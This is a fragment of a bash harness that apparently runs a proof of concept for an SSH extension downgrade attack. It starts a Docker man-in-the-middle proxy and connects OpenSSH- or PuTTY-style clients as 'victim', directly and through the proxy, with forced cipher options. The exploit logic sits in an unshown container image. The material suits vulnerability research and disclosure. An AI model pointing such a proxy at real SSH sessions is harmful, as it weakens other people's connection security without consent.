...
function select_and_run_poc_proxy {
  ...
  echo "[+] Starting extension downgrade attack proxy on port $POC_PORT. Connection will be proxied to 18.136.101.97:$SERVER_PORT"
  docker run -d \
    --network host \
    --name $POC_CONTAINER_NAME \
    $POC_IMAGE --proxy-port $POC_PORT --server-ip "18.136.101.97" --server-port $SERVER_PORT > /dev/null 2>&1
}

function run_client_direct {
  echo "[+] Connecting with $CLIENT_IMPL_NAME client to $SERVER_IMPL_NAME server at 18.136.101.97:$SERVER_PORT as user victim"
  if [[ $CLIENT_IMPL -eq 1 ]]; then
    docker run \
      --network host \
      --name "$CLIENT_CONTAINER_NAME-direct" \
      $CLIENT_IMAGE -vvv -o Ciphers=chacha20-poly1305@openssh.com,aes128-cbc -o MACs=hmac-sha2-256-etm@openssh.com -p $SERVER_PORT victim@18.136.101.97 > /dev/null 2>&1
  else
    docker run \
      --network host \
      --name "$CLIENT_CONTAINER_NAME-direct" \
      $CLIENT_IMAGE -v -P $SERVER_PORT -batch -sshlog /dev/stdout victim@18.136.101.97 > /dev/null 2>&1
  fi
}

function run_client_poc {
  echo "[+] Connecting with $CLIENT_IMPL_NAME client to PoC proxy at 18.136.101.97:$POC_PORT as user victim"
  if [[ $CLIENT_IMPL -eq 1 ]]; then
    docker run \
      --network host \
      --name "$CLIENT_CONTAINER_NAME-poc" \
      $CLIENT_IMAGE -vvv -o Ciphers=chacha20-poly1305@openssh.com,aes128-cbc -o MACs=hmac-sha2-256-etm@openssh.com -p $POC_PORT victim@18.136.101.97 > /dev/null 2>&1
  else
    docker run \
      --network host \
      --name "$CLIENT_CONTAINER_NAME-poc" \
      $CLIENT_IMAGE -v -P $POC_PORT -batch -sshlog /dev/stdout victim@18.136.101.97 > /dev/null 2>&1    
  fi
}
